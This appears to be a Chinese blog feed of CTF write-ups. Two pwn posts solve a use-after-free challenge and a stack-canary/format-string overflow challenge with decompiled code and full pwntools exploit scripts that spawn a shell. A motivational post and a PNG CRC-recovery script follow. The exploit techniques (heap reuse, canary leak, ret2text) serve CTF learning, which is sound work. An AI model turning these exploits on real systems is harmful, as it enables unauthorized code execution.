class="hljs-keyword">return</span> ++i;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<span class="hljs-comment">//create</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your strings&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (&amp;page)[v1]);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<span class="hljs-comment">//edit</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; i )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">free</span>((&amp;page)[v1]);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<span class="hljs-comment">//del</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      echo((&amp;page)[v1]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    (*((<span class="hljs-type">void</span> (__cdecl **)(<span class="hljs-type">char</span> *))page + <span class="hljs-number">1</span>))(page);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<span class="hljs-comment">//show</span><br></code></pre></td></tr></table></figure><p>以及一个很重要的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">NICO</span><span class="hljs-params">(<span class="hljs-type">char</span> *command)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(command);<br>&#125;<span class="hljs-comment">//NICO</span><br></code></pre></td></tr></table></figure><p>本题题目就是UAF，包括在del函数中被free掉指针的chunk后并未将指针赋nullptr，此时uaf就出现了，并且存在的就是第一块空间被free后，第二次申请空间如果申请的chunk与第一次相同，那么第二次申请的地址值与第一次相同（可自行编写程序验证）。本题属于ctf-wiki中提到的：<em>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong></em>。</p><p>本题大家可能会注意到，很多函数都在对0进行特判。首先在create函数中如果创建一个0页的内容，在申请8字空间之后将其赋值为 echo_addr、”giao”，即准备在show调用时执行”echo giao”，即打印”giao”。而这样根据上段开头给予的思路，便可得到如下思路：</p><blockquote><p>申请page0 –&gt; 释放page0 –&gt; 申请page1 –&gt; 编辑page1 –&gt; 执行page0(1)</p></blockquote><p>UAF类型题会更多地出现重复操作的类型，本题exp也会选用函数式编程的形式去编写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 0x3a为main函数中的putchar(58)的内容，即&#x27;:&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>():<br>    io.recvuntil(<span class="hljs-string">b&#x27;\x3a&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, content</span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;\x3a&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    io.recv() <br>    io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>).encode())<br>    io.recv()<br>    io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;\x3a&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    io.recv()<br>    io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;\x3a&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>).encode())<br></code></pre></td></tr></table></figure><p>使用str(id).encode()原因是一是要能send出去，二是要encode为bytes形式，因为作者不喜欢各种各样的警告。</p><p>由此我们注意到应该覆盖什么内容呢？有人会说：前面写<code>*page = &#39;oaig&#39;;*(page + 1) = echo;</code>，那我们写”&#x2F;bin&#x2F;sh”再加NICO函数的地址不就完事了吗？</p><p>注意审题！create函数只为每次申请分配0x8个字节，一个地址就四字节，前面写&#x2F;bin&#x2F;sh怎么会够呢？</p><p>于是，在此可以引入很多系统都会引入的一个概念：环境变量[(百度百科)](<a href="https://baike.baidu.com/item/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F#:~:text=%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%EF%BC%88environment">https://baike.baidu.com/item/环境变量#:~:text=环境变量（environment</a> variables）一般是指在 操作系统 中用来指定操作系统运行环境的一些参数，如： 临时文件夹 位置和 系统文件夹 位置等。.,程序 而没有告诉它程序所在的完整路径时，系统除了在 当前目录 下面寻找此程序外，还应到path中指定的路径去找。. 用户通过设置环境 变量 ，来更好的运行进程。. 中文名.)。</p><p>在类Linux环境下用<code>echo $PATH</code>便可查询，如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/home/ubuntu/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br></code></pre></td></tr></table></figure><p>如此，在理论上，我们使用sh便可以一路搜索到&#x2F;bin路径下并执行，那么payload就可以编写为：</p><p><code>payload = b&#39;sh\x00\x00&#39; + p32(0x08048642)</code></p><p>最终，本题的exp也呼之欲出了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./uaf&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>():<br>    io.recvuntil(<span class="hljs-string">b&#x27;\x3a&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, content</span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;\x3a&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    io.recv() <br>    io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>).encode())<br>    io.recv()<br>    io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;\x3a&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    io.recv()<br>    io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;\x3a&#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>).encode())<br><br>create()<br>delete(<span class="hljs-number">0</span>)<br>create()<br><span class="hljs-comment"># 可在此处下断点，然后调试一下观察脚本与程序都做了哪些事</span><br>payload = <span class="hljs-string">b&#x27;sh\x00\x00&#x27;</span> + p32(<span class="hljs-number">0x08048642</span>)<br>edit(<span class="hljs-number">1</span>, payload)<br>show()<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南森新生赛[Pwn]overflow-wp</title>
    <link href="/2023/03/05/%E5%8D%97%E6%A3%AE%E6%96%B0%E7%94%9F%E8%B5%9B-Pwn-overflow-wp/"/>
    <url>/2023/03/05/%E5%8D%97%E6%A3%AE%E6%96%B0%E7%94%9F%E8%B5%9B-Pwn-overflow-wp/</url>
    
    <content type="html"><![CDATA[<p>checksec:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ checksec overflow<br>[*] <span class="hljs-string">&#x27;/home/ubuntu/Desktop/overflow&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><p>相应地，使用ida打开它</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(&amp;argc);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello Hacker!&quot;</span>);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-comment">//main</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+4h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1</span>; ++i )<br>  &#123;<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>u);<br>    <span class="hljs-built_in">printf</span>(buf);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125; <span class="hljs-comment">//vuln</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">getshell</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125; <span class="hljs-comment">//getshell</span><br></code></pre></td></tr></table></figure><p>出现了很明显的格式化字符串和栈溢出漏洞。</p><p>很明显，本题希望考察学生对于canary的泄露、格式化字符串的利用（可能）、ret2text。</p><p>Canary的位置在char类型串后，由于小端序，Canary的“开头”是’\x00’，用于截断。__stack_chk_fail函数也只会检查另外的三字节。本题泄露canary存在二解。</p><p><strong>第一解</strong>，由于buf长度100，于是第一次输入可以用sendline去输入100个字符，或是send去输入101个字符，再用recv接收。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span><br>io.sendlineafter(<span class="hljs-string">b&quot;Hacker!\n&quot;</span>, payload)<br>io.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span>)<br>canary = u32(io.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0xa</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;Hacker\n&#x27;</span>, payload)<br>io.recvuntil(<span class="hljs-string">b&#x27;\x0a&#x27;</span>)<br>canary = u32(<span class="hljs-string">b&#x27;\x00&#x27;</span> + io.recv(<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure><p><strong>第二解</strong>，由于存在格式化字符串漏洞，可以使用%p %08x等尝试找出偏移。</p><p>首先直接利用%p查找偏移</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ ./overflow<br>Hello Hacker!<br>AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p<br>AAAA-0xffaa13a8-0x200-0x80492d3-0xf7f9dd80-(nil)-0x41414141-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">ubuntu@ubuntu:~/Desktop$ ./overflow<br>Hello Hacker!<br>AAAA.%1<span class="hljs-variable">$p</span>.%2<span class="hljs-variable">$p</span>.%3<span class="hljs-variable">$p</span>.%4<span class="hljs-variable">$p</span>.%5<span class="hljs-variable">$p</span>.[%6<span class="hljs-variable">$p</span>].%7<span class="hljs-variable">$p</span>.%8<span class="hljs-variable">$p</span><br>AAAA.0xff806168.0x200.0x80492d3.0xf7ebdd80.(nil).[0x41414141].0x2431252e.0x32252e70<br></code></pre></td></tr></table></figure><p>（由于已知其偏移，在第二次利用选择了让读者更明晰地找到偏移对应位置的美化）</p><p>等，均可找到输入对应偏移为6.</p><p>本文作者更喜欢用%p去获得值，故本处使用%p去尝试获得canary。</p><p>首先已知buf可存储100字节，在32位程序中，每个%p可取四字节内容（与类C语言中的指针意义类似，在8位程序中为1字，16位程序中为2字，32位程序中为4字，64位程序中为8字，计算方法为x&#x2F;8&#x3D;y），因此，若无偏移，则在（100&#x2F;4）%25$p处可以得到canary的值，有6位偏移，则在（25+6&#x3D;）%31$p处可以得到canary，recv方法基本同上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;%31$p&#x27;</span><br>io.sendlineafter(<span class="hljs-string">b&quot;Hacker!\n&quot;</span>, payload)<br>canary = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;00&quot;</span>), <span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure><p>由此得到的canary便可在直接放在char字符串的后面构建payload，并最终执行ret2text：</p><p><code>payload = b&#39;a&#39; * 100 + p32(canary) + b&#39;a&#39; * 0xC + p32(sh_addr)</code></p><p><code>payload = flat([b&#39;a&#39; * 100, canary, b&#39;a&#39; * 0xC, p32(sh_addr)])</code></p><p>此处0xC已经包含了ebp（savedregs）。</p><p>于是，整理后的exp即为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>text = <span class="hljs-string">&quot;./overflow&quot;</span><br><span class="hljs-comment"># io = remote(&quot;&quot;,)</span><br>io = process(text)<br>elf = ELF(text)<br>sh_addr = elf.sym[<span class="hljs-string">&#x27;getshell&#x27;</span>] <span class="hljs-comment"># sh_addr = 0x08049236</span><br><span class="hljs-comment"># -------------------- payload1_0x1 -------------------- #</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;Hacker!\n&#x27;</span>, payload)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">100</span>)<br>canary = u32(io.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0xa</span><br><span class="hljs-comment"># -------------------- payload1_0x2 -------------------- #</span><br>paylaod = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;Hacker!\n&#x27;</span>, payload)<br>io.recvuntil(<span class="hljs-string">b&#x27;\x0a&#x27;</span>)<br>canary = u32(<span class="hljs-string">b&#x27;\x00&#x27;</span> + io.recv(<span class="hljs-number">3</span>))<br><span class="hljs-comment"># -------------------- payload1_0x3 -------------------- #</span><br>step = <span class="hljs-number">6</span><br>num = step + (<span class="hljs-number">0x70</span> - <span class="hljs-number">0xC</span>) / <span class="hljs-number">4</span> <span class="hljs-comment"># 0x70-0xC=100，即buf大小</span><br>payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;$p&#x27;</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;Hacker!\n&#x27;</span>, payload)<br>canary = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;00&quot;</span>), <span class="hljs-number">16</span>)<br><br>lg(<span class="hljs-string">&quot;canary&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100</span> + p32(canary) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xC</span> + p32(sh_addr)<br><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《呐喊》</title>
    <link href="/2023/02/22/%E3%80%8A%E5%91%90%E5%96%8A%E3%80%8B/"/>
    <url>/2023/02/22/%E3%80%8A%E5%91%90%E5%96%8A%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<p>看到这篇文章的亲爱的人啊！希望你是点进来看的啊！</p><span id="more"></span><p>你一定要记得理解题目的意思啊！你一定要记得看看有没有hint啊！</p><p>你一定要看看题目的libc版本啊！你一定要看看你自己系统的libc版本啊！</p><p>你一定要知道题目是什么类型题啊！</p><p>你一定要仔细阅读源码啊！你一定要反复看反复加强印象啊！你一定要有耐心啊！</p><p>你一定要严谨操作啊！你一定要不断沉淀自己对未来的准备啊！</p><p>你一定要仔细寻找有没有适合的函数啊！</p><p>你一定要熟练使用gdb啊！</p><p>你一定不要成为脚本小子啊！</p><p>你一定能pwn2own的啊！你一定能cat flag的啊！你一定能getshell的啊！你一定能守护好一切的啊！<strong>加油啊！学pwn的大哥哥！</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Outset</tag>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些脚本收集</title>
    <link href="/2023/02/05/%E4%B8%80%E4%BA%9B%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/"/>
    <url>/2023/02/05/%E4%B8%80%E4%BA%9B%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="PNG图片隐写改高宽的反CRC"><a href="#PNG图片隐写改高宽的反CRC" class="headerlink" title="PNG图片隐写改高宽的反CRC"></a>PNG图片隐写改高宽的反CRC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\Smartisan\\Desktop\\e1.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()    <span class="hljs-comment">#打开图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span>(crc32 == <span class="hljs-number">0xa8586b45</span>):    <span class="hljs-comment">#图片当前CRC，自行修改</span><br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hex:&#x27;</span>, <span class="hljs-built_in">hex</span>(i), <span class="hljs-built_in">hex</span>(j))<br></code></pre></td></tr></table></figure><p><img src="/../img/%E5%8F%8DCRC.png" alt="反CRC"></p><p>直接“顺序”写CRC</p><p><code>89 50 4E 47 0D 0A 1A 0A</code>PNG文件头</p><p><code>00 00 00 0D</code>IDCH文件头数据块</p><p><code>49 48 44 52</code>IHDR文件头数据块，固定为IHDR字符</p><p>接下来四字为宽度，如上图中<code>00 00 02 00</code>，以<strong>像素</strong>为单位</p><p>接下来四字为高度，如上图中<code>00 00 02 